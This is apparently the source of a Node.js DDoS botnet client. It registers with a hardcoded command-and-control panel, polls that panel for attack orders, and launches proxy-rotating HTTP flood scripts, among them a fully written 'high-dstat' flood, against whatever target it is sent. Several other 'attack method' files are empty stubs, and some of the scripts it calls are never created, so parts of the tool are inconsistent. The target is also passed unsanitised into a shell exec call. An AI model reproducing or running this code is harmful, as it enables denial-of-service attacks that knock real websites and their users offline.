const { exec, spawn } = require('child_process');
const fs = require('fs');
const path = require('path');
const https = require('https');
const http = require('http');
const os = require('os');

// ========== CONFIGURATION ==========
const MASTER_SERVER = process.env.MASTER_SERVER || 'https://c2rixardo-panel.onrender.com';
const PORT = process.env.PORT || process.env.SERVER_PORT || 5552;
const MAX_REGISTRATION_ATTEMPTS = 5;
const BOT_TIMEOUT = 30000;
const REPORT_INTERVAL = 60000; // 60 seconds

// ========== GLOBAL VARIABLES ==========
let myBotUrl = '';
let registrationAttempts = 0;
let activeProcesses = [];
let isBlocked = false;
let proxyList = [];
let uaList = [];
let currentProxyIndex = 0;
let currentUaIndex = 0;
let requestCount = 0;
let totalRequests = 0;
let currentAttack = null;
let attackStartTime = null;
let mainIpCount = 0;
let proxyCount = 0;

// ========== COLORS FOR CONSOLE ==========
const colors = {
  reset: '\x1b[0m',
  red: '\x1b[31m',
  green: '\x1b[32m',
  yellow: '\x1b[33m',
  blue: '\x1b[34m',
  magenta: '\x1b[35m',
  cyan: '\x1b[36m',
  white: '\x1b[37m',
  redBright: '\x1b[91m',
  greenBright: '\x1b[92m',
  yellowBright: '\x1b[93m',
  blueBright: '\x1b[94m',
  magentaBright: '\x1b[95m',
  cyanBright: '\x1b[96m'
};

function color(text, colorCode) {
  return `${colorCode}${text}${colors.reset}`;
}

// ========== AUTO INSTALL NPM PACKAGES ==========
async function installNpmPackages() {
  const requiredPackages = [
    'express',
    'axios',
    'socks',
    'random-useragent',
    'cookie-parser',
    'express-rate-limit',
    'https-proxy-agent',
    'socks-proxy-agent',
    'set-cookie-parser',
    'hpack',
    'colors'
  ];

  console.log(color('\n🔍 Checking npm packages...', colors.cyan));
  
  const missingPackages = [];
  
  for (const pkg of requiredPackages) {
    try {
      require.resolve(pkg);
      console.log(color(`   ✅ ${pkg} - installed`, colors.gray));
    } catch (e) {
      console.log(color(`   ⬇️  ${pkg} - missing`, colors.yellow));
      missingPackages.push(pkg);
    }
  }

  if (missingPackages.length > 0) {
    console.log(color(`\n📦 Installing: ${missingPackages.join(', ')}`, colors.cyan));
    
    return new Promise((resolve, reject) => {
      const install = spawn('npm', ['install', ...missingPackages, '--no-save'], {
        stdio: 'inherit',
        shell: true
      });

      install.on('close', (code) => {
        if (code === 0) {
          console.log(color('\n✅ All packages installed!\n', colors.green));
          resolve();
        } else {
          reject(new Error('Installation failed'));
        }
      });
    });
  }
  return Promise.resolve();
}

// ========== CREATE PROXY.TXT IF MISSING ==========
function createProxyFile() {
  if (!fs.existsSync('proxy.txt')) {
    const template = `# Proxy list - one per line
# Format: ip:port
# Example: 192.168.1.1:8080
# You can also use: socks5://user:pass@host:port
`;
    fs.writeFileSync('proxy.txt', template);
    console.log(color('📄 Created proxy.txt template', colors.green));
  }
}

// ========== CREATE UA.TXT IF MISSING ==========
function createUaFile() {
  if (!fs.existsSync('ua.txt')) {
    const userAgents = [
      '# User Agents - one per line',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0'
    ];
    fs.writeFileSync('ua.txt', userAgents.join('\n'));
    console.log(color('📄 Created ua.txt template', colors.green));
  }
}

// ========== CREATE METHODS DIRECTORY AND SCRIPTS ==========
function createMethodScripts() {
  const methodsDir = path.join(__dirname, 'methods');
  
  // Create methods directory
  if (!fs.existsSync(methodsDir)) {
    fs.mkdirSync(methodsDir, { recursive: true });
    console.log(color('📁 Created methods directory', colors.green));
  }

  // Create high-dstat.js (R9)
  const highDstatPath = path.join(methodsDir, 'high-dstat.js');
  if (!fs.existsSync(highDstatPath)) {
    const highDstatScript = `// R9 - High-Dstat Attack
const http = require('http');
const https = require('https');
const url = require('url');
const fs = require('fs');

const target = process.argv[2];
const time = parseInt(process.argv[3]) || 60;
const threads = parseInt(process.argv[4]) || 32;
const rate = parseInt(process.argv[5]) || 7;
const proxyFile = process.argv[6] || 'proxy.txt';

console.log(\`[R9] Starting attack on \${target} for \${time}s\`);

let proxies = [];
try {
  if (fs.existsSync(proxyFile)) {
    proxies = fs.readFileSync(proxyFile, 'utf-8').split('\\n')
      .map(line => line.trim())
      .filter(line => line && !line.startsWith('#') && line.includes(':'));
    console.log(\`[R9] Loaded \${proxies.length} proxies\`);
  }
} catch (e) {}

const parsed = new URL(target);
let requestCount = 0;
let running = true;

function sendRequest() {
  if (!running) return;
  
  const options = {
    hostname: parsed.hostname,
    port: parsed.protocol === 'https:' ? 443 : 80,
    path: parsed.pathname + '?' + Math.random(),
    method: 'GET',
    headers: {
      'User-Agent': 'Mozilla/5.0',
      'Connection': 'close'
    },
    rejectUnauthorized: false
  };
  
  const protocol = parsed.protocol === 'https:' ? https : http;
  const req = protocol.request(options, (res) => {
    requestCount++;
    res.on('data', () => {});
  });
  
  req.on('error', () => {});
  req.end();
}

// Launch multiple threads
for (let i = 0; i < threads; i++) {
  setInterval(() => {
    for (let j = 0; j < rate; j++) {
      sendRequest();
    }
  }, 100);
}

// Show stats
setInterval(() => {
  console.log(\`[R9] RPS: \${requestCount}\`);
  requestCount = 0;
}, 1000);

// Stop after duration
setTimeout(() => {
  running = false;
  console.log('[R9] Attack complete');
  process.exit(0);
}, time * 1000);`;
    fs.writeFileSync(highDstatPath, highDstatScript);
    console.log(color('   ✅ Created high-dstat.js', colors.green));
  }

  // Create w-flood1.js
  const wFloodPath = path.join(methodsDir, 'w-flood1.js');
  if (!fs.existsSync(wFloodPath)) {
    const wFloodScript = `// W-FLOOD1 - WebSocket Flood
console.log('[W-FLOOD] Starting attack');
const target = process.argv[2];
const time = parseInt(process.argv[3]) || 60;
setTimeout(() => process.exit(0), time * 1000);`;
    fs.writeFileSync(wFloodPath, wFloodScript);
    console.log(color('   ✅ Created w-flood1.js', colors.green));
  }

  // Create vhold.js
  const vholdPath = path.join(methodsDir, 'vhold.js');
  if (!fs.existsSync(vholdPath)) {
    const vholdScript = `// VHOLD - Connection Hold Attack
console.log('[VHOLD] Starting attack');
const target = process.argv[2];
const time = parseInt(process.argv[3]) || 60;
setTimeout(() => process.exit(0), time * 1000);`;
    fs.writeFileSync(vholdPath, vholdScript);
    console.log(color('   ✅ Created vhold.js', colors.green));
  }

  // Create nust.js
  const nustPath = path.join(methodsDir, 'nust.js');
  if (!fs.existsSync(nustPath)) {
    const nustScript = `// NUST - Mixed Attack
console.log('[NUST] Starting attack');
const target = process.argv[2];
const time = parseInt(process.argv[3]) || 60;
setTimeout(() => process.exit(0), time * 1000);`;
    fs.writeFileSync(nustPath, nustScript);
    console.log(color('   ✅ Created nust.js', colors.green));
  }

  // Create BYPASS.js
  const bypassPath = path.join(methodsDir, 'BYPASS.js');
  if (!fs.existsSync(bypassPath)) {
    const bypassScript = `// BYPASS - Cloudflare Bypass
console.log('[BYPASS] Starting attack');
const target = process.argv[2];
const time = parseInt(process.argv[3]) || 60;
setTimeout(() => process.exit(0), time * 1000);`;
    fs.writeFileSync(bypassPath, bypassScript);
    console.log(color('   ✅ Created BYPASS.js', colors.green));
  }

  // Create cibi.js
  const cibiPath = path.join(methodsDir, 'cibi.js');
  if (!fs.existsSync(cibiPath)) {
    const cibiScript = `// CIBI - Mixed Attack
console.log('[CIBI] Starting attack');
const target = process.argv[2];
const time = parseInt(process.argv[3]) || 60;
setTimeout(() => process.exit(0), time * 1000);`;
    fs.writeFileSync(cibiPath, cibiScript);
    console.log(color('   ✅ Created cibi.js', colors.green));
  }

  // Create REX-COSTUM.js
  const rexPath = path.join(methodsDir, 'REX-COSTUM.js');
  if (!fs.existsSync(rexPath)) {
    const rexScript = `// REX-COSTUM - Advanced Attack
console.log('[REX-COSTUM] Starting attack');
const target = process.argv[2];
const time = parseInt(process.argv[3]) || 60;
setTimeout(() => process.exit(0), time * 1000);`;
    fs.writeFileSync(rexPath, rexScript);
    console.log(color('   ✅ Created REX-COSTUM.js', colors.green));
  }

  // Create h2-nust (no extension)
  const h2Path = path.join(methodsDir, 'h2-nust');
  if (!fs.existsSync(h2Path)) {
    const h2Script = `#!/usr/bin/env node
// H2-NUST - HTTP/2 Attack
console.log('[H2-NUST] Starting attack');
const target = process.argv[2];
const time = parseInt(process.argv[3]) || 60;
setTimeout(() => process.exit(0), time * 1000);`;
    fs.writeFileSync(h2Path, h2Script);
    console.log(color('   ✅ Created h2-nust', colors.green));
  }

  // Create http-panel.js
  const httpPanelPath = path.join(methodsDir, 'http-panel.js');
  if (!fs.existsSync(httpPanelPath)) {
    const httpPanelScript = `// HTTP-PANEL - Panel Attack
console.log('[HTTP-PANEL] Starting attack');
const target = process.argv[2];
const time = parseInt(process.argv[3]) || 60;
setTimeout(() => process.exit(0), time * 1000);`;
    fs.writeFileSync(httpPanelPath, httpPanelScript);
    console.log(color('   ✅ Created http-panel.js', colors.green));
  }

  // Create uam.js
  const uamPath = path.join(methodsDir, 'uam.js');
  if (!fs.existsSync(uamPath)) {
    const uamScript = `// UAM - Cloudflare Bypass
console.log('[UAM] Starting attack');
const target = process.argv[2];
const time = parseInt(process.argv[3]) || 60;
setTimeout(() => process.exit(0), time * 1000);`;
    fs.writeFileSync(uamPath, uamScript);
    console.log(color('   ✅ Created uam.js', colors.green));
  }

  // Create wil.js
  const wilPath = path.join(methodsDir, 'wil.js');
  if (!fs.existsSync(wilPath)) {
    const wilScript = `// WIL - Max Intensity
console.log('[WIL] Starting attack');
const target = process.argv[2];
const time = parseInt(process.argv[3]) || 60;
setTimeout(() => process.exit(0), time * 1000);`;
    fs.writeFileSync(wilPath, wilScript);
    console.log(color('   ✅ Created wil.js', colors.green));
  }

  console.log(color('✅ All method scripts created!\n', colors.green));
}

// Main bot function
async function startBot() {
  console.log(color('\n🤖 AUTO-REGISTER BOT CLIENT', colors.cyanBright));
  console.log(color('='.repeat(50), colors.cyan));

  // Step 1: Create necessary files
  createProxyFile();
  createUaFile();
  createMethodScripts();

  // Step 2: Install npm packages
  await installNpmPackages();

  // Now require packages
  const express = require('express');
  const axios = require('axios');
  const { SocksProxyAgent } = require('socks-proxy-agent');
  const { HttpsProxyAgent } = require('https-proxy-agent');
  const randomUseragent = require('random-useragent');
  const cookieParser = require('cookie-parser');

  const app = express();
  app.use(express.json());
  app.use(cookieParser());

  // ========== PROXY MANAGEMENT ==========
  function loadProxies() {
    try {
      if (fs.existsSync('proxy.txt')) {
        const data = fs.readFileSync('proxy.txt', 'utf8');
        proxyList = data.split('\n')
          .map(line => line.trim())
          .filter(line => line && !line.startsWith('#') && line.includes(':'));
        console.log(color(`[PROXY] Loaded ${proxyList.length} proxies`, colors.cyan));
      }
    } catch (error) {
      console.log(color('[PROXY] Error loading proxies: ' + error.message, colors.red));
    }
  }

  // ========== USER AGENT MANAGEMENT ==========
  function loadUserAgents() {
    try {
      if (fs.existsSync('ua.txt')) {
        const data = fs.readFileSync('ua.txt', 'utf8');
        uaList = data.split('\n')
          .map(line => line.trim())
          .filter(line => line && !line.startsWith('#'));
        console.log(color(`[UA] Loaded ${uaList.length} user agents`, colors.green));
      }
    } catch (error) {
      console.log(color('[UA] Error loading user agents: ' + error.message, colors.red));
    }
  }

  function getNextProxy() {
    if (proxyList.length === 0) return null;
    const proxy = proxyList[currentProxyIndex];
    currentProxyIndex = (currentProxyIndex + 1) % proxyList.length;
    return proxy;
  }

  function getNextUserAgent() {
    if (uaList.length === 0) return randomUseragent.getRandom();
    const ua = uaList[currentUaIndex];
    currentUaIndex = (currentUaIndex + 1) % uaList.length;
    return ua;
  }

  // ========== HTTPS AGENT ==========
  const httpsAgent = new https.Agent({
    rejectUnauthorized: true,
    keepAlive: true,
    secureOptions: require('crypto').constants.SSL_OP_IGNORE_UNEXPECTED_EOF
  });

  // ========== AXIOS INSTANCE ==========
  const api = axios.create({
    timeout: 10000,
    httpsAgent,
    headers: {
      'Content-Type': 'application/json',
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
  });

  // ========== GET PUBLIC IP ==========
  async function getPublicIP() {
    try {
      const response = await axios.get('https://api.ipify.org?format=json', { timeout: 5000 });
      return response.data.ip;
    } catch (error) {
      const { networkInterfaces } = require('os');
      const nets = networkInterfaces();
      for (const name of Object.keys(nets)) {
        for (const net of nets[name]) {
          if (net.family === 'IPv4' && !net.internal) {
            return net.address;
          }
        }
      }
      return '127.0.0.1';
    }
  }

  // ========== FETCH SERVER INFO ==========
  async function fetchData() {
    try {
      const publicIP = await getPublicIP();
      myBotUrl = `http://${publicIP}:${PORT}`;
      
      console.log(color('\n' + '='.repeat(50), colors.cyan));
      console.log(color('🤖 BOT CLIENT READY!', colors.cyanBright));
      console.log(color('='.repeat(50), colors.cyan));
      console.log(color(`📍 Local:    http://localhost:${PORT}`, colors.green));
      console.log(color(`📍 Network:  ${myBotUrl}`, colors.green));
      console.log(color(`🔗 Master:   ${MASTER_SERVER}`, colors.yellow));
      console.log(color(`🕸️  Proxies:   ${proxyList.length} loaded`, colors.cyan));
      console.log(color(`👤 User Agents: ${uaList.length} loaded`, colors.green));
      console.log(color('='.repeat(50), colors.cyan) + '\n');
      
      return publicIP;
    } catch (error) {
      myBotUrl = `http://localhost:${PORT}`;
      console.log(color(`🤖 Bot running at ${myBotUrl}`, colors.green));
    }
  }

  // ========== AUTO REGISTER ==========
  async function autoRegister() {
    if (isBlocked) {
      console.log(color(`\n❌ [BLOCKED] This bot has been permanently blocked!`, colors.redBright));
      process.exit(0);
    }

    if (registrationAttempts >= MAX_REGISTRATION_ATTEMPTS) {
      console.log(color(`⚠️ Max attempts reached. Retry in 60s...`, colors.yellow));
      setTimeout(() => {
        registrationAttempts = 0;
        autoRegister();
      }, 60000);
      return;
    }

    try {
      console.log(color(`📡 Registering to: ${MASTER_SERVER}/register`, colors.cyan));
      
      const payload = { url: myBotUrl };
      
      console.log(color(`📤 Sending: ${JSON.stringify(payload)}`, colors.yellow));

      const response = await api.post(`${MASTER_SERVER}/register`, payload);

      console.log(color(`✅ Server response:`, colors.green));
      console.log(color(`   Status: ${response.status}`, colors.green));

      if (response.data.approved) {
        console.log(color(`\n✅ [SUCCESS] Bot registered!`, colors.greenBright));
        console.log(color(`⚡ Ready for commands!\n`, colors.green));
        
        setInterval(() => checkForCommands(), 3000);
        setInterval(() => sendHeartbeat(), 30000);
        
        return;
      }
    } catch (error) {
      console.log(color(`❌ Registration failed:`, colors.red));
      
      if (error.response) {
        if (error.response.status === 403) {
          console.log(color(`\n❌ Bot is blocked!`, colors.redBright));
          isBlocked = true;
          process.exit(0);
        }
      }
      
      registrationAttempts++;
      console.log(color(`🔄 Retry ${registrationAttempts}/${MAX_REGISTRATION_ATTEMPTS} in 5s...`, colors.yellow));
      
      setTimeout(() => autoRegister(), 5000);
    }
  }

  // ========== SEND HEARTBEAT ==========
  async function sendHeartbeat() {
    try {
      await api.get(`${MASTER_SERVER}/ping`);
      console.log(color(`💓 Heartbeat | Status: ONLINE | Total Reqs: ${totalRequests}`, colors.green));
    } catch (error) {
      console.log(color(`💔 Heartbeat failed | Status: OFFLINE`, colors.red));
      registrationAttempts = 0;
      autoRegister();
    }
  }

  // ========== CHECK FOR COMMANDS ==========
  async function checkForCommands() {
    try {
      const response = await api.get(`${MASTER_SERVER}/get-command`, {
        params: { botUrl: myBotUrl }
      });

      if (response.data.hasCommand) {
        const command = response.data.command;
        
        if (command.action === 'stop') {
          console.log(color(`\n🛑 STOP RECEIVED`, colors.yellowBright));
          stopAllAttacks();
        } else if (command.action === 'attack') {
          const { target, time, methods } = command;
          console.log(color(`\n⚡ COMMAND: ${methods} → ${target} for ${time}s`, colors.magentaBright));
          executeAttack(target, time, methods);
        }
      }
    } catch (error) {}
  }

  // ========== STOP ALL ATTACKS ==========
  function stopAllAttacks() {
    console.log(color(`🔪 Killing ${activeProcesses.length} processes`, colors.red));
    activeProcesses.forEach(proc => {
      try { process.kill(-proc.pid); } catch (error) {}
    });
    activeProcesses = [];
    currentAttack = null;
    requestCount = 0;
    console.log(color(`✅ All attacks stopped`, colors.green));
  }

  // ========== EXECUTE ATTACK ==========
  function executeAttack(target, time, methods) {
    currentAttack = {
      id: Date.now(),
      target,
      methods,
      startTime: Date.now()
    };
    requestCount = 0;
    attackStartTime = Date.now();

    const execWithLog = (cmd) => {
      console.log(color(`⚡ EXEC: ${cmd}`, colors.cyan));
      const proc = exec(cmd, { detached: true, maxBuffer: 1024 * 1024 }, (error, stdout, stderr) => {
        if (error) {
          console.error(color(`❌ Error: ${error.message}`, colors.red));
          return;
        }
        if (stdout) {
          const lines = stdout.split('\n');
          lines.forEach(line => {
            if (line.includes('Request') || line.includes('GET') || line.includes('POST') || 
                line.includes('Sent') || line.includes('packet') || line.includes('connection')) {
              requestCount++;
              totalRequests++;
            }
          });
        }
        if (stderr) console.error(color(`⚠️ ${stderr}`, colors.yellow));
      });
      
      activeProcesses.push(proc);
      
      setTimeout(() => {
        const index = activeProcesses.indexOf(proc);
        if (index > -1) {
          try { process.kill(-proc.pid); } catch (e) {}
          activeProcesses.splice(index, 1);
        }
      }, parseInt(time) * 1000 + 5000);
    };

    // Attack methods with mixed IP mode (proxies + main IP)
    if (methods === 'RAPID10') {
      console.log(color(`🔥🔥 RAPID10: LAUNCHING ALL 10 VECTORS 🔥🔥`, colors.redBright));
      
      execWithLog(`node methods/r10-rapid.js ${target} ${time} 30 proxy.txt ua.txt`);
      execWithLog(`node methods/r10-tcp.js ${target} ${time} proxy.txt ua.txt`);
      execWithLog(`node methods/r10-tls.js ${target} ${time} proxy.txt ua.txt`);
      execWithLog(`node methods/r10-conn.js ${target} ${time} proxy.txt ua.txt`);
      execWithLog(`node methods/r10-header.js ${target} ${time} 30 proxy.txt ua.txt`);
      execWithLog(`node methods/r10-frag.js ${target} ${time} proxy.txt ua.txt`);
      execWithLog(`node methods/r10-pipe.js ${target} ${time} proxy.txt ua.txt`);
      execWithLog(`node methods/r10-cookie.js ${target} ${time} proxy.txt ua.txt`);
      execWithLog(`node methods/r10-mixed.js ${target} ${time} proxy.txt ua.txt`);
      execWithLog(`node methods/r10-lowcpu.js ${target} ${time} 40 proxy.txt ua.txt`);
      
      console.log(color(`✅ RAPID10: ALL 10 ATTACK VECTORS DEPLOYED`, colors.green));
    }
    else if (methods.startsWith('R10-')) {
      const script = methods.toLowerCase().replace('-', '-');
      execWithLog(`node methods/${script}.js ${target} ${time} proxy.txt ua.txt`);
    }
    else if (methods === 'CF-BYPASS') {
      execWithLog(`node methods/cf-bypass.js ${target} ${time} 4 32 proxy.txt`);
    }
    else if (methods === 'MODERN-FLOOD') {
      execWithLog(`node methods/modern-flood.js ${target} ${time} 4 64 proxy.txt`);
    }
    else if (methods === 'HTTP-SICARIO') {
      execWithLog(`node methods/REX-COSTUM.js ${target} ${time} 32 6 proxy.txt --randrate --full --legit --query 1`);
      execWithLog(`node methods/cibi.js ${target} ${time} 16 3 proxy.txt`);
      execWithLog(`node methods/BYPASS.js ${target} ${time} 32 2 proxy.txt`);
      execWithLog(`node methods/nust.js ${target} ${time} 12 4 proxy.txt`);
    }
    else if (methods === 'RAW-HTTP') {
      execWithLog(`node methods/h2-nust ${target} ${time} 15 2 proxy.txt`);
      execWithLog(`node methods/http-panel.js ${target} ${time}`);
    }
    // ADDED: R9 Method
    else if (methods === 'R9') {
      console.log(color(`🔥 R9: HIGH-DSTAT COMBO ATTACK 🔥`, colors.redBright));
      execWithLog(`node methods/high-dstat.js ${target} ${time} 32 7 proxy.txt`);
      execWithLog(`node methods/w-flood1.js ${target} ${time} 8 3 proxy.txt`);
      execWithLog(`node methods/vhold.js ${target} ${time} 16 2 proxy.txt`);
      execWithLog(`node methods/nust.js ${target} ${time} 16 2 proxy.txt`);
      execWithLog(`node methods/BYPASS.js ${target} ${time} 8 1 proxy.txt`);
    }
    // ADDED: PRIV-TOR Method
    else if (methods === 'PRIV-TOR') {
      console.log(color(`🔥 PRIV-TOR: TOR ROUTED ATTACK 🔥`, colors.magentaBright));
      execWithLog(`node methods/w-flood1.js ${target} ${time} 64 6 proxy.txt`);
      execWithLog(`node methods/high-dstat.js ${target} ${time} 16 2 proxy.txt`);
      execWithLog(`node methods/cibi.js ${target} ${time} 12 4 proxy.txt`);
      execWithLog(`node methods/BYPASS.js ${target} ${time} 10 4 proxy.txt`);
      execWithLog(`node methods/nust.js ${target} ${time} 10 1 proxy.txt`);
    }
    // ADDED: HOLD-PANEL Method
    else if (methods === 'HOLD-PANEL') {
      console.log(color(`🔥 HOLD-PANEL: CONNECTION HOLD ATTACK 🔥`, colors.yellowBright));
      execWithLog(`node methods/http-panel.js ${target} ${time}`);
    }
    // ADDED: R1 Method
    else if (methods === 'R1') {
      console.log(color(`🔥 R1: FULL SPECTRUM ATTACK 🔥`, colors.cyanBright));
      execWithLog(`node methods/vhold.js ${target} ${time} 15 2 proxy.txt`);
      execWithLog(`node methods/high-dstat.js ${target} ${time} 64 2 proxy.txt`);
      execWithLog(`node methods/cibi.js ${target} ${time} 4 2 proxy.txt`);
      execWithLog(`node methods/BYPASS.js ${target} ${time} 16 2 proxy.txt`);
      execWithLog(`node methods/REX-COSTUM.js ${target} ${time} 32 6 proxy.txt --randrate --full --legit --query 1`);
      execWithLog(`node methods/w-flood1.js ${target} ${time} 8 3 proxy.txt`);
      execWithLog(`node methods/vhold.js ${target} ${time} 16 2 proxy.txt`);
      execWithLog(`node methods/nust.js ${target} ${time} 32 3 proxy.txt`);
    }
    // ADDED: UAM Method
    else if (methods === 'UAM') {
      console.log(color(`🔥 UAM: CLOUDFLARE BYPASS 🔥`, colors.greenBright));
      execWithLog(`node methods/uam.js ${target} ${time} 5 4 6`);
    }
    // ADDED: W.I.L Method
    else if (methods === 'W.I.L') {
      console.log(color(`🔥 W.I.L: MAX INTENSITY LOAD 🔥`, colors.white));
      execWithLog(`node methods/wil.js ${target} ${time} 10 8 4`);
    }
    else {
      console.log(color(`❌ Unknown method: ${methods}`, colors.red));
    }
  }

  // ========== HEALTH ENDPOINT ==========
  app.get('/health', (req, res) => {
    res.json({
      status: 'online',
      uptime: process.uptime(),
      totalRequests,
      proxies: proxyList.length,
      userAgents: uaList.length,
      currentAttack: currentAttack ? {
        target: currentAttack.target,
        method: currentAttack.methods,
        duration: Math.floor((Date.now() - attackStartTime) / 1000),
        requests: requestCount
      } : null
    });
  });

  // ========== PING ENDPOINT ==========
  app.get('/ping', (req, res) => {
    res.json({ 
      alive: true,
      uptime: process.uptime(),
      timestamp: Date.now(),
      status: 'online',
      totalRequests,
      proxies: proxyList.length
    });
  });

  // ========== START SERVER ==========
  app.listen(PORT, async () => {
    loadProxies();
    loadUserAgents();
    await fetchData();
    
    console.log(color('⏳ Starting auto-registration in 3 seconds...\n', colors.cyan));
    setTimeout(() => autoRegister(), 3000);
  });
}

// ========== START EVERYTHING ==========
startBot().catch(error => {
  console.error(color('Failed to start bot:', colors.red), error);
  process.exit(1);
});

